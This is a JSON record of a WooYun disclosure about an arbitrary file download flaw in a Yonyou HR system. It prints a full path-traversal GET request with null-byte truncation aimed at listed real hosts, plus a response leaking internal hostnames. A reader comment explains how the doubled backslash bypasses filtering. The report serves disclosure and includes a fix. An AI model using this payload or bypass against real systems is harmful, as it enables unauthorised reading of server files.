{"id": 41473, "wybug_id": "wooyun-2015-096676", "wybug_title": "用友某系统任意文件下载", "wybug_corp": "用友软件", "wybug_author": "ToySweet", "wybug_date": "2015-02-10 22:50", "wybug_open_date": "2015-05-12 09:00", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向公众公开  简要描述： 用友某系统任意文件下载 详细说明：  用友人力资源管理任意文件下载之前挖过的一个注入，5个为例子吧218.2.115.222:8088120.40.72.157:4001219.140.193.253zhaopin.cnooc.com.cn发送的数据包\nGET //hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts%00.html HTTP/1.1Host: 218.2.115.222:8088User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=D8D50F9A857CE283FA65DDBD3676A014Connection: keep-alive\n返回包\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Set-Cookie: JSESSIONID=A639145A4865CCAD8371CA270A54AC3A; Path=/hrsscontent-disposition: attachment;filename=\"const.js\"Last-Modified: Thu, 09 Oct 2014 06:37:36 GMTContent-Type: application/octet-streamDate: Tue, 10 Feb 2015 12:00:54 GMTContent-Length: 153var 192.168.4.2=\"sqldatabase2\";var 127.0.0.1=\"localhost\";var 192.168.4.9=\"sql-cluster\";var 192.168.4.3=\"sqldatabase1\";var 192.168.4.44=\"pt-erptest\";\ncountry 和 language字段都存在任意文件下载   漏洞证明：  \n\n\n\n\n\n   修复方案：  通过递归过滤\\和..等特殊字符，防止00截断   版权声明：转载请注明来源 ToySweet@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-02-11 08:59 厂商回复： 多谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-12 17:21 |    \t\tsec \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | none for security)\t\t \n  为什么是双斜线？求解惑    \n     2015-05-12 18:28 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  @sec 转义啊，人家服务端做了一次过滤了，你再加一个斜线，正好完美的避开人家的过滤。。。。！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}